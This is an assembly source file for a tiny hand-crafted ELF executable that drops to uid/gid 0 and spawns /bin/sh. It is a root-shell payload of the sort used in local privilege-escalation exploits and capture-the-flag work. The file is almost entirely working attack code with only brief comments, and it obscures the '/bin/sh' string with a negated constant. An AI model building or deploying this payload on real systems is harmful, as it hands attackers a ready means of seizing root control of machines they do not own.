; Minimal ELF that does:
; setuid(0)
; setgid(0)
; execve('/bin/sh', ['/bin/sh'], NULL)
;
; INP=shell; nasm -f bin -o $INP $INP.S
BITS 64
ehdr:                               ; ELF64_Ehdr
        db  0x7F, "ELF", 2, 1, 1, 0 ; e_indent
times 8 db  0                       ; EI_PAD
        dw  3                       ; e_type
        dw  0x3e                    ; e_machine
        dd  1                       ; e_version
        dq  _start                  ; e_entry
        dq  phdr - $$               ; e_phoff
        dq  0                       ; e_shoff
        dd  0                       ; e_flags
        dw  ehdrsize                ; e_ehsize
        dw  phdrsize                ; e_phentsize
        dw  1                       ; e_phnum
        dw  0                       ; e_shentsize
        dw  0                       ; e_shnum
        dw  0                       ; e_shstrndx

ehdrsize    equ $ - ehdr

phdr:                               ; ELF64_Phdr
        dd  1                       ; p_type
        dd  5                       ; p_flags
        dq  0                       ; p_offset
        dq  $$                      ; p_vaddr
        dq  $$                      ; p_paddr
        dq  filesize                ; p_filesz
        dq  filesize                ; p_memsz
        dq  0x1000                  ; p_align

phdrsize    equ $ - phdr

_start:
    xor rdi, rdi
    mov al, 0x69
    syscall                         ; setuid(0)
    xor rdi, rdi
    mov al, 0x6a                    ; setgid(0)
    syscall
    mov rbx, 0xff978cd091969dd1
    neg rbx							; "/bin/sh"
    push rbx
    mov rdi, rsp
    push rsi,
    push rdi,
    mov rsi, rsp
    mov al, 0x3b
    syscall                         ; execve("/bin/sh", ["/bin/sh"], NULL)

filesize    equ $ - $$
